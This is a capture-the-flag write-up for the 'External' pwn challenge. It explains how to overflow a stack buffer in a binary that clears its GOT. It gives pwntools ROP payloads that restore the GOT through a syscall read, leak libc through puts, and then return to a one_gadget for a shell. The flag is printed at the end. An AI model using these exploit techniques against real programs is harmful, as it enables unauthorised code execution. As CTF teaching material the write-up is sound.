## External  
#### Description  
No description.

#### Author  
M_alpha

#### Points and solves  
467 points and 69 solves.

We are given a binary, that reads out input, clears the GOT table and somehow
we need to get a shell.

```c  
undefined8 main(void)  
{  
 undefined buff [80];  
 puts("ROP me ;)");  
 printf("> ");  
 read(0,buff,0xf0);  
 clear_got();  
 return 0;  
}  
```

The function ```clear_got``` does exactly what we expect it to do, it uses
```memeset``` to set the entire GOT to 0.

In addition, we have a very usefull gadget in one of the setup functions:  
```asm  
00401283 0f 05      SYSCALL  
00401285 c3         RET  
```

### The vulnerability  
It is obvious we can overflow ```buff``` and like in the challenge ```echo```,  
we keep out eyes peeled for a way to abuse the syscall gadaget.

However, is it not a trivial rop chain, because we can't immediatly return to
```plt``` functions.  
So, after a quick research about dynamic linking, I figured out the following,  
the GOT entry for any function, say ```printf```, by default is pointing to
```plt.printf + 0x6```  
At that address lays the dynamic linking routine for ```printf```.  
If we can set all the zeroed GOT entries to some resolving function in the
```plt``` section, we can reload the GOT entries.

### 1. Setting up conditions for restoring the GOT:  
```python  
payload = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(got_start) + p64(0) +
p64(syscall_ret) +\  
p64(elf.sym.main)  
payload = 0x58*b"A"+payload  
p.sendline(payload)  
```  
We have a rop chain that loads ```rdi = 0, rsi = &GOT``` and returns to a
syscall, and to main afterwards.  
Since main returns 0, by the time we are executing the rop chain ```rax``` is
0, which is the syscall number for ```read```.  
At the time we syscall, we will actually read back into the GOT table.

### 2. Rewriting GOT table:  
The GOT entries in the binary are in the following order: [puts, setbuf,
printf, memset, alarm, read, signal]  
```python  
payload = p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["setbuf"]+6) +
p64(elf.sym.plt["puts"]+6) +\  
	p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["alarm"]+6) + p64(elf.sym.plt["read"]+6) +\  
	p64(elf.sym.plt["signal"]+6)  
p.sendline(payload)  
```  
So, we load the appropriate ```plt``` values into the GOT, but we can't just
load them the same way,  
because memset will zero them again, so we just patch the GOT entry for memset
with ```plt.puts```.  
Now, by the time we return to ```main``` the function will resolve their
addresses based on the ```plt``` values that are in the GOT tablle.

### 3. Leak libc:  
We now have a "stable" binary that won't erase the GOT on us, and we can just
leak libc with a simple rop chain:  
```python  
payload = p64(pop_rdi) + p64(elf.sym.got["puts"]) + p64(elf.sym.plt["puts"]) +
p64(elf.sym.main)  
```

### 4. Get shell:  
We have a one_gadget at ```0x448a3``` offset, we can just return to that with
another rop chain.  
```python  
p.sendline(0x58*b"C" + p64(libc.address + one_shot_offset) + b"\x00"*0x100)  
```

#### Flag  
```flag{0h_nO_My_G0t!!!!1111!1!}```  

Original writeup (https://github.com/ElikBelik77/ctfs-
writeups/tree/master/offshift/external).